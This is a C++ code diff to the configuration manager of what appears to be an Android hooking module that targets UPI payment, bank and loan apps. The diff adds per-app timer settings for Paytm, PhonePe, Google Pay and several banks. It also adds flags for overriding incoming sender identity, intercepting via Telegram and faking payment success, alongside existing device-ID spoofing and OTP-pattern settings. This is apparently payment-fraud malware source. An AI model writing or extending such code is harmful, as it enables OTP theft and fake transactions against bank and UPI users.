@@ -94,6 +94,41 @@ std::map<std::string, std::string> parse_headers(const std::string& json) {
     return headers;
 }
 
+std::map<std::string, int> parse_int_map(const std::string& json, const std::string& key) {
+    std::map<std::string, int> result;
+    const std::string needle = "\"" + key + "\"";
+    auto pos = json.find(needle);
+    if (pos == std::string::npos) return result;
+    pos = json.find('{', pos);
+    if (pos == std::string::npos) return result;
+    auto end = json.find('}', pos);
+    if (end == std::string::npos) return result;
+
+    std::string block = json.substr(pos + 1, end - pos - 1);
+    size_t cursor = 0;
+    while (cursor < block.size()) {
+        auto key_start = block.find('"', cursor);
+        if (key_start == std::string::npos) break;
+        auto key_end = block.find('"', key_start + 1);
+        if (key_end == std::string::npos) break;
+        auto colon = block.find(':', key_end);
+        if (colon == std::string::npos) break;
+        auto value_start = block.find_first_not_of(" \t\r\n", colon + 1);
+        if (value_start == std::string::npos) break;
+        size_t value_end = value_start;
+        while (value_end < block.size() &&
+               (std::isdigit(static_cast<unsigned char>(block[value_end])) || block[value_end] == '-')) {
+            ++value_end;
+        }
+        try {
+            result[block.substr(key_start + 1, key_end - key_start - 1)] =
+                std::stoi(block.substr(value_start, value_end - value_start));
+        } catch (...) {}
+        cursor = value_end + 1;
+    }
+    return result;
+}
+
 std::map<std::string, bool> parse_bool_map(const std::string& json, const std::string& key) {
     std::map<std::string, bool> result;
     const std::string needle = "\"" + key + "\"";
@@ -206,6 +241,10 @@ bool ConfigManager::load() {
     config_.enable_device_id_spoof = parse_bool(json, "enable_device_id_spoof", false);
     config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
     config_.upi_timer_bonus_seconds = parse_int(json, "upi_timer_bonus_seconds", 20);
+    config_.upi_app_timer_bonuses = parse_int_map(json, "upi_app_timer_bonuses");
+    config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", true);
+    config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
+    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", false);
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
@@ -229,4 +268,29 @@ bool ModuleConfig::is_upi_app_hooked(const std::string& package) const {
     const auto it = hooked_upi_apps.find(package);
     if (it == hooked_upi_apps.end()) return false;
     return it->second;
+}
+
+int default_timer_for_package(const std::string& package) {
+    if (package == "net.one97.paytm") return 40;
+    if (package == "com.phonepe.app") return 25;
+    if (package == "com.google.android.apps.nbu.paisa.user") return 25;
+    if (package.find("yespay") != std::string::npos) return 45;
+    if (package.find("kreditbee") != std::string::npos ||
+        package.find("stashfin") != std::string::npos ||
+        package.find("branch") != std::string::npos ||
+        package.find("loan") != std::string::npos) return 50;
+    if (package.find("bank") != std::string::npos ||
+        package.find("icici") != std::string::npos ||
+        package.find("sbi") != std::string::npos ||
+        package.find("hdfc") != std::string::npos) return 40;
+    if (package == "com.dreamplug.androidapp") return 35;
+    if (package == "in.org.npci.upiapp") return 20;
+    return 20;
+}
+
+int ModuleConfig::timer_bonus_for_package(const std::string& package) const {
+    const auto it = upi_app_timer_bonuses.find(package);
+    if (it != upi_app_timer_bonuses.end() && it->second > 0) return it->second;
+    if (upi_timer_bonus_seconds > 0) return upi_timer_bonus_seconds;
+    return default_timer_for_package(package);
 }
